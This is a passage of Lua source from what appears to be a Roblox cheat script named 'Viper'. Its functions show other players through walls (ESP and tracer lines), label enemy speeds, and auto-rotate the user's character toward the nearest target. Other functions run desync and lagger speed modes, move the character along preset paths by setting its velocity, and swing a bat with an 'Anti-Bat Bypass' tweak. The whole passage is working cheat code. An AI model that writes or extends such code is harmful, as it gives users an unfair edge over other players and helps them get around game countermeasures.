        if esp.NameTag then pcall(function() esp.NameTag.Enabled = false end) end
        return
    end

    local character = plr.Character
    local hum = character and character:FindFirstChildOfClass("Humanoid")
    local trackPart = character and (
        character:FindFirstChild("HumanoidRootPart")
        or character.PrimaryPart
        or character:FindFirstChild("UpperTorso")
        or character:FindFirstChild("Torso")
        or character:FindFirstChild("Head")
    )

    if character and trackPart and hum and hum.Health > 0 and character.Parent then
        if esp.Highlight then
            pcall(function()
                local safeFolder = getSafeESPFolder()
                if not esp.Highlight.Parent or esp.Highlight.Parent ~= safeFolder then
                    esp.Highlight.Parent = safeFolder
                end
                esp.Highlight.Adornee = character
                esp.Highlight.Enabled = true
            end)
        end
        if esp.Tracer then esp.Tracer.Visible = false end
        for _, line in ipairs(esp.Lines or {}) do line.Visible = false end

        if esp.NameTag and esp.NameLabel then
            pcall(function()
                local safeGui = getSafeGuiParent()
                if not esp.NameTag.Parent or esp.NameTag.Parent ~= safeGui then
                    esp.NameTag.Parent = safeGui
                end
                esp.NameTag.Adornee = trackPart
                esp.NameTag.Enabled = true
                local spd = 0
                if trackPart and trackPart:IsA("BasePart") then
                    local v = trackPart.AssemblyLinearVelocity or trackPart.Velocity
                    if v then
                        local flat = Vector3.new(v.X, 0, v.Z)
                        spd = math.floor(flat.Magnitude + 0.5)
                    end
                end
                local pName = plr.Name or plr.DisplayName or ""
                esp.NameLabel.Text = tostring(pName)
                esp.NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            end)
        end
    else
        if esp.Tracer then esp.Tracer.Visible = false end
        if esp.Highlight then
            pcall(function()
                esp.Highlight.Enabled = false
                esp.Highlight.Adornee = nil
            end)
        end
        for _, line in ipairs(esp.Lines or {}) do line.Visible = false end
        if esp.NameTag then
            pcall(function()
                esp.NameTag.Enabled = false
                esp.NameTag.Adornee = nil
            end)
        end
    end
end

function createESPForPlayer(plr)
    if plr == LP then return end
    if espActivePlayers[plr] and espActivePlayers[plr].esp then
        updateESP(plr, espActivePlayers[plr].esp)
        return
    end
    removeESP(plr)
    local esp = createESP()
    espActivePlayers[plr] = { esp = esp }
    updateESP(plr, esp)
end

local espJoinConn, espLeaveConn
function enableESP(force)
    espEnabled = true
    if espLoopConn and not force then return end
    if espLoopConn then
        pcall(function() espLoopConn:Disconnect() end)
        espLoopConn = nil
    end

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP then
            task.spawn(function()
                createESPForPlayer(plr)
            end)
        end
    end

    local espAccumulator = 0
    espLoopConn = RunService.Heartbeat:Connect(function(dt)
        if not espEnabled then return end
        espAccumulator = espAccumulator + (dt or 0)
        if espAccumulator < 0.15 then return end
        espAccumulator = 0
        for plr, data in pairs(espActivePlayers) do
            if typeof(plr) == "Instance" and plr:IsA("Player") and data and data.esp then
                pcall(function() updateESP(plr, data.esp) end)
            end
        end
    end)

    if espJoinConn then pcall(function() espJoinConn:Disconnect() end) end
    espJoinConn = Players.PlayerAdded:Connect(function(plr)
        if not espEnabled or plr == LP then return end
        task.wait(0.3)
        createESPForPlayer(plr)
    end)

    if espLeaveConn then pcall(function() espLeaveConn:Disconnect() end) end
    espLeaveConn = Players.PlayerRemoving:Connect(function(plr)
        removeESP(plr)
    end)
end

function disableESP()
    espEnabled = false
    if espLoopConn then pcall(function() espLoopConn:Disconnect() end); espLoopConn = nil end
    if espJoinConn then pcall(function() espJoinConn:Disconnect() end); espJoinConn = nil end
    if espLeaveConn then pcall(function() espLeaveConn:Disconnect() end); espLeaveConn = nil end
    for plr in pairs(espActivePlayers) do
        if typeof(plr) == "Instance" and plr:IsA("Player") and plr ~= LP then
            removeESP(plr)
        end
    end
end

function toggleESP(on)
    if on then
        enableESP(true)
    else
        disableESP()
    end
    if setESPVIsual then setESPVIsual(on) end
end



local _espLineGui = nil
local _espLineFrame = nil
local _espLineOutline = nil
local _espLineConn = nil
local _espLineState = { scanElapsed = math.huge, targetRoot = nil }

function ensureESPLineGui()
    if _espLineGui and _espLineGui.Parent then return end
    _espLineGui = Instance.new("ScreenGui")
    _espLineGui.Name = "ViperESPLine"
    _espLineGui.IgnoreGuiInset = true
    _espLineGui.ResetOnSpawn = false
    _espLineGui.DisplayOrder = 1000
    _espLineGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    local okP = pcall(function() _espLineGui.Parent = game:GetService("CoreGui") end)
    if not okP then _espLineGui.Parent = LP:WaitForChild("PlayerGui") end

    _espLineFrame = Instance.new("Frame")
    _espLineFrame.Name = "ESPLine"
    _espLineFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    _espLineFrame.BorderSizePixel = 0
    _espLineFrame.Active = false
    _espLineFrame.Visible = false
    _espLineFrame.BackgroundColor3 = getThemeColor()
    _espLineFrame.ZIndex = 1
    _espLineFrame.Parent = _espLineGui

    _espLineOutline = Instance.new("UIStroke", _espLineFrame)
    _espLineOutline.Color = Color3.fromRGB(255, 255, 255)
    _espLineOutline.Thickness = 0.7
    _espLineOutline.Transparency = 0.45
end

function stopESPLine()
    espLineEnabled = false
    if _espLineConn then _espLineConn:Disconnect(); _espLineConn = nil end
    if _espLineFrame then _espLineFrame.Visible = false end
    _espLineState.targetRoot = nil
    _espLineState.scanElapsed = math.huge
    if _espLineGui and _espLineGui.Parent then
        pcall(function() _espLineGui:Destroy() end)
    end
    _espLineGui = nil
    _espLineFrame = nil
    _espLineOutline = nil
end

function startESPLine()
    espLineEnabled = true
    ensureESPLineGui()
    if _espLineConn then _espLineConn:Disconnect() end
    _espLineState.scanElapsed = math.huge
    _espLineState.targetRoot = nil

    _espLineConn = RunService.RenderStepped:Connect(function(dt)
        if not espLineEnabled then
            if _espLineFrame then _espLineFrame.Visible = false end
            return
        end
        local ok = pcall(function()
            local activeCamera = workspace.CurrentCamera
            local myChar = LP.Character
            local myRoot = myChar and (myChar:FindFirstChild("LowerTorso") or myChar:FindFirstChild("HumanoidRootPart") or myChar:FindFirstChild("Torso"))
            if not activeCamera or not myRoot then
                if _espLineFrame then _espLineFrame.Visible = false end
                return
            end

            local myPosition = myRoot.Position
            _espLineState.scanElapsed = _espLineState.scanElapsed + (dt or 0)
            local cachedRoot = _espLineState.targetRoot
            local cachedCharacter = cachedRoot and cachedRoot.Parent
            local cachedHumanoid = cachedCharacter and cachedCharacter:FindFirstChildOfClass("Humanoid")
            local cachedValid = cachedRoot and cachedRoot.Parent and (not cachedHumanoid or cachedHumanoid.Health > 0)
            if _espLineState.scanElapsed >= 0.12 or not cachedValid then
                _espLineState.scanElapsed = 0
                local closestRoot, closestDistanceSq = nil, math.huge
                for _, otherPlayer in ipairs(Players:GetPlayers()) do
                    if otherPlayer ~= LP then
                        local character = otherPlayer.Character
                        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                        local root = character and (character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("LowerTorso") or character:FindFirstChild("Torso"))
                        if root and root:IsA("BasePart") and (not humanoid or humanoid.Health > 0) then
                            local delta = root.Position - myPosition
                            local distanceSq = delta:Dot(delta)
                            if distanceSq < closestDistanceSq then
                                closestRoot, closestDistanceSq = root, distanceSq
                            end
                        end
                    end
                end
                _espLineState.targetRoot = closestRoot
            end

            local closestRoot = _espLineState.targetRoot
            if not closestRoot or not closestRoot.Parent then
                if _espLineFrame then _espLineFrame.Visible = false end
                return
            end
            local closestPosition = closestRoot.Position

            local from = activeCamera:WorldToViewportPoint(myPosition - Vector3.new(0, myRoot.Size.Y * 0.35, 0))
            local to, targetOnScreen = activeCamera:WorldToViewportPoint(closestPosition)
            local viewport = activeCamera.ViewportSize
            local fromPoint = Vector2.new(from.X, from.Y)
            local targetPoint = Vector2.new(to.X, to.Y)

            if not targetOnScreen or to.Z <= 0 then
                local center = viewport * 0.5
                local direction = targetPoint - center
                if to.Z <= 0 then direction = -direction end
                if direction.Magnitude < 0.001 then direction = Vector2.new(0, -1) end
                local limit = Vector2.new(math.max(8, center.X - 8), math.max(8, center.Y - 8))
                local scaleX = limit.X / math.max(math.abs(direction.X), 0.001)
                local scaleY = limit.Y / math.max(math.abs(direction.Y), 0.001)
                targetPoint = center + direction * math.min(scaleX, scaleY)
            end

            if from.Z <= 0 or fromPoint.X < 0 or fromPoint.X > viewport.X or fromPoint.Y < 0 or fromPoint.Y > viewport.Y then
                fromPoint = Vector2.new(viewport.X * 0.5, viewport.Y - 8)
            end

            local delta = targetPoint - fromPoint
            local midpoint = (fromPoint + targetPoint) * 0.5
            _espLineFrame.Position = UDim2.fromOffset(midpoint.X, midpoint.Y)
            _espLineFrame.Size = UDim2.fromOffset(math.max(delta.Magnitude, 1), 2)
            _espLineFrame.Rotation = math.deg(math.atan2(delta.Y, delta.X))
            _espLineFrame.BackgroundColor3 = getThemeColor()
            _espLineFrame.Visible = true
        end)
        if not ok and _espLineFrame then
            pcall(function() _espLineFrame.Visible = false end)
        end
    end)
end

local _enemySpeedAcc = 0
function updateEnemySpeedLabels()
    _enemySpeedAcc = _enemySpeedAcc + 1
    if _enemySpeedAcc < 6 then return end
    _enemySpeedAcc = 0
    local color = getThemeColor()
    local players = _GetPlayersCached()
    for i = 1, #players do
        local player = players[i]
        if player ~= LP then
            local char = player.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hrp and hum and hum.Health > 0 then
                local v = hrp.AssemblyLinearVelocity
                local speed = _sqrt(v.X*v.X + v.Z*v.Z)
                local label = enemySpeedLabels[player]
                if not label then
                    local head = char:FindFirstChild("Head")
                    if head then
                        local bb = Instance.new("BillboardGui")
                        bb.Size = UDim2.new(0, 100, 0, 25)
                        bb.StudsOffset = _V3new(0, 5.5, 0)
                        bb.AlwaysOnTop = true
                        bb.Name = "EnemySpeedGui"
                        bb.Parent = head
                        local tl = Instance.new("TextLabel", bb)
                        tl.Size = UDim2.new(1, 0, 1, 0)
                        tl.BackgroundTransparency = 1
                        tl.TextColor3 = color
                        tl.Font = Enum.Font.GothamBold
                        tl.TextScaled = true
                        tl.TextStrokeTransparency = 0
                        tl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                        enemySpeedLabels[player] = tl
                        label = tl
                    end
                elseif label.Parent and label.Parent.Parent ~= char then
                    local head = char:FindFirstChild("Head")
                    if head then label.Parent.Parent = head end
                end
                if label then
                    label.Text = string.format("%.1f", speed)
                    if label.TextColor3 ~= color then label.TextColor3 = color end
                end
            else
                local label = enemySpeedLabels[player]
                if label and label.Parent and label.Parent.Parent then label.Parent.Parent = nil end
                enemySpeedLabels[player] = nil
            end
        end
    end
end

function startEnemySpeed()
    if enemySpeedConn then enemySpeedConn:Disconnect() end
    enemySpeedConn = RunService.Heartbeat:Connect(updateEnemySpeedLabels)
end

function stopEnemySpeed()
    if enemySpeedConn then enemySpeedConn:Disconnect(); enemySpeedConn = nil end
end

function getClosestTargetBody()
    local char = LP.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local rpos = root.Position
    local closest, minDist = nil, _huge
    local plist = _GetPlayersCached()
    for i = 1, #plist do
        local plr = plist[i]
        if plr ~= LP then
            local c = plr.Character
            if c then
                local tRoot = c:FindFirstChild("HumanoidRootPart")
                if tRoot then
                    local hum = c:FindFirstChildOfClass("Humanoid")
                    if hum and hum.Health > 0 then
                        local dx = tRoot.Position.X - rpos.X
                        local dy = tRoot.Position.Y - rpos.Y
                        local dz = tRoot.Position.Z - rpos.Z
                        local d = dx*dx + dy*dy + dz*dz
                        if d < minDist then minDist = d; closest = tRoot end
                    end
                end
            end
        end
    end
    return closest
end

function _bodyLockTick()
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local target = getClosestTargetBody()
    if not target then
        if not hum.AutoRotate then hum.AutoRotate = true end
        return
    end
    local dist = (target.Position - root.Position).Magnitude
    if dist > bodyLockRange then
        if not hum.AutoRotate then hum.AutoRotate = true end
        return
    end
    if hum.AutoRotate then hum.AutoRotate = false end
    local targetVel = target.AssemblyLinearVelocity
    local speed3 = targetVel.Magnitude
    local predictTime = _clamp(speed3 / 80, 0.08, 0.35)
    local predictedPos = target.Position + targetVel * predictTime
    local targetHead = target.Parent and target.Parent:FindFirstChild("Head")
    local targetHeight = targetHead and targetHead.Position.Y or target.Position.Y
    local myHeight = root.Position.Y + (hum.HipHeight or 0)
    local heightDiff = targetHeight - myHeight
    local verticalCorrection = _clamp(heightDiff * 0.15, -1.5, 1.5)
    local flatTarget = _V3new(predictedPos.X, root.Position.Y + verticalCorrection, predictedPos.Z)
    local toPredict = flatTarget - root.Position
    if toPredict.Magnitude > 0.1 then
        local goalCF = _CFlookAt(root.Position, flatTarget)
        local diffCF = root.CFrame:Inverse() * goalCF
        local _, ry, _ = diffCF:ToEulerAnglesXYZ()
        ry = _clamp(ry, -2.5, 2.5)
        root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(_V3new(0, ry * 42, 0))
    end
end

function startBodyLock()
    if _bodyLockConn then _bodyLockConn:Disconnect() end
    local acc = 0
    _bodyLockConn = RunService.Heartbeat:Connect(function(dt)
        if not bodyLockEnabled then return end
        if _blSuppressCount > 0 then return end
        acc = acc + dt
        if acc < 0.033 then return end
        acc = 0
        _bodyLockTick()
    end)
end

function stopBodyLock()
    if _bodyLockConn then
        _bodyLockConn:Disconnect()
        _bodyLockConn = nil
    end
    local c = LP.Character
    local root = c and c:FindFirstChild("HumanoidRootPart")
    if root then
        root.AssemblyAngularVelocity = _V3zero
        root.AssemblyLinearVelocity = _V3new(root.AssemblyLinearVelocity.X, -0.1, root.AssemblyLinearVelocity.Z)
    end
    local hum2 = c and c:FindFirstChildOfClass("Humanoid")
    if hum2 then hum2.AutoRotate = true end
end

function _suppressBodyLock()
    _blSuppressCount = _blSuppressCount + 1
    if _blSuppressCount == 1 and bodyLockEnabled then
        _blWasEnabled = true
        stopBodyLock()
        if bodyLockSetVisual then bodyLockSetVisual(false) end
        if _blRestoreTimer then
            task.cancel(_blRestoreTimer)
            _blRestoreTimer = nil
        end
        _blSmoothRestore = false
    end
end

function _unsuppressBodyLock(delayed)
    if _blSuppressCount > 0 then
        _blSuppressCount = _blSuppressCount - 1
    end
    if _blSuppressCount == 0 and _blWasEnabled then
        _blWasEnabled = false
        if _blRestoreTimer then
            pcall(task.cancel, _blRestoreTimer)
            _blRestoreTimer = nil
        end
        local function restore()
            _blRestoreTimer = nil
            if bodyLockEnabled then
                _blSmoothRestore = true
                startBodyLock()
                if bodyLockSetVisual then bodyLockSetVisual(true) end
                task.delay(0.5, function() _blSmoothRestore = false end)
            end
        end
        if delayed then
            _blRestoreTimer = task.delay(1, restore)
        else
            restore()
        end
    end
end

function setupSpeedIndicator(char)
    local head = char:WaitForChild("Head", 5)
    if not head then return end

    local oldBB = head:FindFirstChild("ViperSpeedIndicator")
    if oldBB then oldBB:Destroy() end
    local oldDiscord = head:FindFirstChild("DiscordText")
    if oldDiscord then oldDiscord:Destroy() end

    local accent = getThemeColor()
    local bb = Instance.new("BillboardGui")
    bb.Name = "ViperSpeedIndicator"
    -- Compact overhead indicator: smaller and cleaner, without a LIVE badge.
    bb.Size = UDim2.fromOffset(158, 50)
    bb.StudsOffset = Vector3.new(0, 3.15, 0)
    bb.AlwaysOnTop = true
    bb.LightInfluence = 0
    bb.MaxDistance = 0
    bb.Parent = head

    local glow = Instance.new("Frame")
    glow.Name = "SpeedGlow"
    glow.Position = UDim2.new(0, -2, 0, -2)
    glow.Size = UDim2.new(1, 4, 1, 4)
    glow.BackgroundColor3 = accent
    glow.BackgroundTransparency = 0.88
    glow.BorderSizePixel = 0
    glow.ZIndex = 1
    glow.Parent = bb
    Instance.new("UICorner", glow).CornerRadius = UDim.new(0, 8)

    local panel = Instance.new("Frame")
    panel.Name = "SpeedCard"
    panel.Size = UDim2.fromScale(1, 1)
    panel.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
    panel.BackgroundTransparency = 0.42
    panel.BorderSizePixel = 0
    panel.ZIndex = 2
    panel.Parent = bb
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 8)

    local panelStroke = Instance.new("UIStroke")
    panelStroke.Name = "OuterStroke"
    panelStroke.Color = accent
    panelStroke.Thickness = 1.1
    panelStroke.Transparency = 0.12
    panelStroke.Parent = panel

    local panelGradient = Instance.new("UIGradient")
    panelGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 38)),
        ColorSequenceKeypoint.new(0.55, Color3.fromRGB(22, 22, 30)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(12, 12, 18)),
    })
    panelGradient.Rotation = 15
    panelGradient.Parent = panel

    local accentBar = Instance.new("Frame")
    accentBar.Name = "AccentBar"
    accentBar.Position = UDim2.new(0, 0, 0, 7)
    accentBar.Size = UDim2.new(0, 2, 1, -14)
    accentBar.BackgroundColor3 = accent
    accentBar.BorderSizePixel = 0
    accentBar.ZIndex = 3
    accentBar.Parent = panel
    Instance.new("UICorner", accentBar).CornerRadius = UDim.new(1, 0)

    -- Compact card: no extra VIPER X NEBULA branding or divider above the speed.
    speedLabel = Instance.new("TextLabel")
    speedLabel.Name = "SpeedLabel"
    speedLabel.Position = UDim2.new(0, 8, 0, 7)
    speedLabel.Size = UDim2.new(0, 62, 0, 21)
    speedLabel.BackgroundTransparency = 1
    speedLabel.Text = "0.0"
    speedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    speedLabel.Font = Enum.Font.GothamBlack
    speedLabel.TextSize = 16
    speedLabel.TextXAlignment = Enum.TextXAlignment.Left
    speedLabel.TextYAlignment = Enum.TextYAlignment.Center
    speedLabel.TextScaled = false
    speedLabel.TextTruncate = Enum.TextTruncate.AtEnd
    speedLabel.ZIndex = 4
    speedLabel.Parent = panel

    local unitLabel = Instance.new("TextLabel")
    unitLabel.Name = "SpeedUnit"
    unitLabel.Position = UDim2.new(0, 9, 0, 28)
    unitLabel.Size = UDim2.new(0, 62, 0, 8)
    unitLabel.BackgroundTransparency = 1
    unitLabel.Text = "STUDS / SEC"
    unitLabel.TextColor3 = Color3.fromRGB(145, 153, 174)
    unitLabel.Font = Enum.Font.GothamMedium
    unitLabel.TextSize = 5
    unitLabel.TextXAlignment = Enum.TextXAlignment.Left
    unitLabel.ZIndex = 4
    unitLabel.Parent = panel

    local modePill = Instance.new("Frame")
    modePill.Name = "ModePill"
    modePill.Position = UDim2.new(0, 76, 0, 12)
    modePill.Size = UDim2.new(1, -84, 0, 18)
    modePill.BackgroundColor3 = accent
    modePill.BackgroundTransparency = 0.83
    modePill.BorderSizePixel = 0
    modePill.ZIndex = 3
    modePill.Parent = panel
    Instance.new("UICorner", modePill).CornerRadius = UDim.new(0, 5)
    local modeStroke = Instance.new("UIStroke", modePill)
    modeStroke.Name = "ModeStroke"
    modeStroke.Color = accent
    modeStroke.Thickness = 1
    modeStroke.Transparency = 0.52

    local modeLabel = Instance.new("TextLabel")
    modeLabel.Name = "ModeLabel"
    modeLabel.Size = UDim2.new(1, -8, 1, 0)
    modeLabel.Position = UDim2.new(0, 4, 0, 0)
    modeLabel.BackgroundTransparency = 1
    modeLabel.Text = string.upper(getSpeedModeName())
    modeLabel.TextColor3 = Color3.fromRGB(246, 247, 255)
    modeLabel.Font = Enum.Font.GothamBold
    modeLabel.TextSize = 7
    modeLabel.TextXAlignment = Enum.TextXAlignment.Center
    modeLabel.TextYAlignment = Enum.TextYAlignment.Center
    modeLabel.TextTruncate = Enum.TextTruncate.AtEnd
    modeLabel.ZIndex = 4
    modeLabel.Parent = modePill
end

local unwalkSavedAnimate = nil

function startUnwalk()
    local c = LP.Character
    if not c then return end
    local hum = c:FindFirstChildOfClass("Humanoid")
    if hum then
        for _, t in ipairs(hum:GetPlayingAnimationTracks()) do pcall(function() t:Stop() end) end
    end
    local anim = c:FindFirstChild("Animate")
    if anim then
        unwalkSavedAnimate = anim:Clone()
        anim:Destroy()
    end
end

function stopUnwalk()
    local c = LP.Character
    if c then
        local existing = c:FindFirstChild("Animate")
        if not existing then
            local src = game:GetService("StarterPlayer"):FindFirstChildOfClass("StarterCharacterScripts")
            local starterAnim = src and src:FindFirstChild("Animate")
            if starterAnim then
                starterAnim:Clone().Parent = c
            elseif unwalkSavedAnimate then
                unwalkSavedAnimate:Clone().Parent = c
            end
        end
    end
    unwalkSavedAnimate = nil
end

function refreshSpeedModeLabel()
    if modeValLbl then
        if desyncSpeedToggled then modeValLbl.Text = "Desync Speed"
        elseif desyncCarryToggled then modeValLbl.Text = "Desync Carry"
        elseif laggerCarryToggled then modeValLbl.Text = "Lagger Carry"
        elseif laggerToggled then modeValLbl.Text = "Lagger Normal"
        elseif speedMode then modeValLbl.Text = "Carry"
        else modeValLbl.Text = "Normal" end
    end
    if setCarryModeVisual then setCarryModeVisual(speedMode) end
    if setLaggerModeVisual then setLaggerModeVisual(laggerToggled) end
    if setLaggerCarryVisual then setLaggerCarryVisual(laggerCarryToggled) end
    if mobSetDesyncSpd then mobSetDesyncSpd(desyncSpeedToggled or desyncCarryToggled) end
end

function resetMovementState()
    refreshSpeedModeLabel()
    if mobSetCarry then mobSetCarry(speedMode) end
    if setLaggerModeVisual then setLaggerModeVisual(laggerToggled) end
    if setLaggerCarryVisual then setLaggerCarryVisual(laggerCarryToggled) end
    if mobSetDesyncSpd then mobSetDesyncSpd(desyncSpeedToggled or desyncCarryToggled) end
end

function toggleCarryMode()
    if desyncSpeedToggled or laggerToggled or laggerCarryToggled then
        desyncSpeedToggled = false
desyncCarryToggled = false
        laggerToggled = false
        laggerCarryToggled = false
        speedMode = false -- Start at Normal
    else
        speedMode = not speedMode
    end
    resetMovementState()
    if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
end

function toggleDesyncSpeedMode()
    if not desyncSpeedToggled and not desyncCarryToggled then
        desyncSpeedToggled = true
        desyncCarryToggled = false
        speedMode = false
        laggerToggled = false
        laggerCarryToggled = false
    elseif desyncSpeedToggled then
        desyncSpeedToggled = false
        desyncCarryToggled = true
    else
        desyncSpeedToggled = false
        desyncCarryToggled = false
    end
    resetMovementState()
    if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
end

function toggleLaggerMode()
    if laggerCarryToggled then laggerCarryToggled = false end
    desyncSpeedToggled = false
desyncCarryToggled = false
    speedMode = false; laggerToggled = not laggerToggled
    resetMovementState()
    if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
end
function toggleLaggerCarryMode()
    if laggerToggled then laggerToggled = false end
    desyncSpeedToggled = false
desyncCarryToggled = false
    speedMode = false; laggerCarryToggled = not laggerCarryToggled
    resetMovementState()
    if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
end

function toggleLaggerCycle()
    desyncSpeedToggled = false
desyncCarryToggled = false
    if not laggerToggled and not laggerCarryToggled then
        speedMode = false
        laggerToggled = true
        laggerCarryToggled = false
    elseif laggerToggled then
        speedMode = false
        laggerToggled = false
        laggerCarryToggled = true
    else
        speedMode = false
        laggerToggled = true
        laggerCarryToggled = false
    end
    resetMovementState()
    if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
end

function stopAutoLeft()
    if alConn then alConn:Disconnect(); alConn = nil end
    alPhase = 1
    local char = LP.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then hum:Move(_V3zero, false) end
    end
    if autoLeftSetVisual then autoLeftSetVisual(false) end
    if mobSetAutoLeft then mobSetAutoLeft(false) end
    _unsuppressBodyLock(true)
end

function startAutoLeft()
    if autoRightEnabled then
        autoRightEnabled = false
        stopAutoRight()
        if autoRightSetVisual then autoRightSetVisual(false) end
        if mobSetAutoRight then mobSetAutoRight(false) end
    end
    disableAllAimbots()
    _suppressBodyLock()
    if alConn then alConn:Disconnect() end
    alPhase = 1
    alConn = RunService.Heartbeat:Connect(function()
        if not autoLeftEnabled then return end
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end
        local spd = NS
        if alPhase == 1 then
            local tgt = _V3new(AP.L1.X, root.Position.Y, AP.L1.Z)
            if (tgt - root.Position).Magnitude < 1 then
                alPhase = 2
                local d = AP.L2 - root.Position
                local mv = _V3new(d.X, 0, d.Z).Unit
                hum:Move(mv, false)
                root.AssemblyLinearVelocity = _V3new(mv.X * spd, root.AssemblyLinearVelocity.Y, mv.Z * spd)
                return
            end
            local d = AP.L1 - root.Position
            local mv = _V3new(d.X, 0, d.Z).Unit
            hum:Move(mv, false)
            root.AssemblyLinearVelocity = _V3new(mv.X * spd, root.AssemblyLinearVelocity.Y, mv.Z * spd)
        elseif alPhase == 2 then
            local tgt = _V3new(AP.L2.X, root.Position.Y, AP.L2.Z)
            if (tgt - root.Position).Magnitude < 1 then
                hum:Move(_V3zero, false)
                root.AssemblyLinearVelocity = _V3zero
                autoLeftEnabled = false
                if alConn then alConn:Disconnect(); alConn = nil end
                alPhase = 1
                if autoLeftSetVisual then autoLeftSetVisual(false) end
                if mobSetAutoLeft then mobSetAutoLeft(false) end
                _unsuppressBodyLock(true)
                local facePos = _V3new(AP.L_FACE.X, root.Position.Y, AP.L_FACE.Z)
                if (facePos - root.Position).Magnitude > 0.01 then
                    root.CFrame = _CFnew(root.Position, facePos)
                end
                return
            end
            local d = AP.L2 - root.Position
            local mv = _V3new(d.X, 0, d.Z).Unit
            hum:Move(mv, false)
            root.AssemblyLinearVelocity = _V3new(mv.X * spd, root.AssemblyLinearVelocity.Y, mv.Z * spd)
        end
    end)
end

function stopAutoRight()
    if arConn then arConn:Disconnect(); arConn = nil end
    arPhase = 1
    local char = LP.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then hum:Move(_V3zero, false) end
    end
    if autoRightSetVisual then autoRightSetVisual(false) end
    if mobSetAutoRight then mobSetAutoRight(false) end
    _unsuppressBodyLock(true)
end

function startAutoRight()
    if autoLeftEnabled then
        autoLeftEnabled = false
        stopAutoLeft()
        if autoLeftSetVisual then autoLeftSetVisual(false) end
        if mobSetAutoLeft then mobSetAutoLeft(false) end
    end
    disableAllAimbots()
    _suppressBodyLock()
    if arConn then arConn:Disconnect() end
    arPhase = 1
    arConn = RunService.Heartbeat:Connect(function()
        if not autoRightEnabled then return end
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end
        local spd = NS
        if arPhase == 1 then
            local tgt = _V3new(AP.R1.X, root.Position.Y, AP.R1.Z)
            if (tgt - root.Position).Magnitude < 1 then
                arPhase = 2
                local d = AP.R2 - root.Position
                local mv = _V3new(d.X, 0, d.Z).Unit
                hum:Move(mv, false)
                root.AssemblyLinearVelocity = _V3new(mv.X * spd, root.AssemblyLinearVelocity.Y, mv.Z * spd)
                return
            end
            local d = AP.R1 - root.Position
            local mv = _V3new(d.X, 0, d.Z).Unit
            hum:Move(mv, false)
            root.AssemblyLinearVelocity = _V3new(mv.X * spd, root.AssemblyLinearVelocity.Y, mv.Z * spd)
        elseif arPhase == 2 then
            local tgt = _V3new(AP.R2.X, root.Position.Y, AP.R2.Z)
            if (tgt - root.Position).Magnitude < 1 then
                hum:Move(_V3zero, false)
                root.AssemblyLinearVelocity = _V3zero
                autoRightEnabled = false
                if arConn then arConn:Disconnect(); arConn = nil end
                arPhase = 1
                if autoRightSetVisual then autoRightSetVisual(false) end
                if mobSetAutoRight then mobSetAutoRight(false) end
                _unsuppressBodyLock(true)
                local facePos = _V3new(AP.R_FACE.X, root.Position.Y, AP.R_FACE.Z)
                if (facePos - root.Position).Magnitude > 0.01 then
                    root.CFrame = _CFnew(root.Position, facePos)
                end
                return
            end
            local d = AP.R2 - root.Position
            local mv = _V3new(d.X, 0, d.Z).Unit
            hum:Move(mv, false)
            root.AssemblyLinearVelocity = _V3new(mv.X * spd, root.AssemblyLinearVelocity.Y, mv.Z * spd)
        end
    end)
end

function getClosestTarget()
    local char = LP.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local rpos = root.Position
    local closest, minDist = nil, _huge
    local plist = _GetPlayersCached()
    for i = 1, #plist do
        local plr = plist[i]
        if plr ~= LP then
            local c = plr.Character
            if c then
                local tRoot = c:FindFirstChild("HumanoidRootPart")
                if tRoot then
                    local hum = c:FindFirstChildOfClass("Humanoid")
                    if hum and hum.Health > 0 then
                        local dx = tRoot.Position.X - rpos.X
                        local dy = tRoot.Position.Y - rpos.Y
                        local dz = tRoot.Position.Z - rpos.Z
                        local d = dx*dx + dy*dy + dz*dz
                        if d < minDist then minDist = d; closest = tRoot end
                    end
                end
            end
        end
    end
    return closest
end

function isBatTool(tool)
    if not tool then return false end
    if BAT_COUNTER_SLAP_LIST then
        for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
            if tool.Name == name then return true end
        end
    end
    return tool.Name:lower():find("bat") or tool.Name:lower():find("slap")
end

function trySwing(target)
    pcall(function()
        local char = LP.Character
        if not char then return end
        local currentTool = char:FindFirstChildOfClass("Tool")
        if currentTool and not isBatTool(currentTool) then return end
        local bat = findBat()
        if bat then
            if bat.Parent ~= char then
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum then pcall(function() hum:EquipTool(bat) end) end
            end

            -- Anti-Bat Bypass: Bat handle massless ve non-collidable (fizik sekmesini engeller)
            local handle = bat:FindFirstChild("Handle")
            if handle then
                handle.Massless = true
                handle.CanCollide = false
            end

            pcall(function() bat:Activate() end)

